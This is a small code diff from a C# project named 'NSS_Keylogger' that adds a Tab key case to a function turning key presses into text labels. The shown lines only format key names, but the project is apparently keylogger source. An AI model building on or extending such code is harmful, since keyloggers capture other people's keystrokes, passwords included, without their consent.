@@ -355,6 +355,8 @@ namespace NSS_Keylogger
                     return "<Backspace>";
                 case Keys.CapsLock:
                     return "<CapsLock>";
+                case Keys.Tab:
+                    return "<Tab>";
                 case Keys.Enter:
                     return "<Enter>";
                 case Keys.Escape:
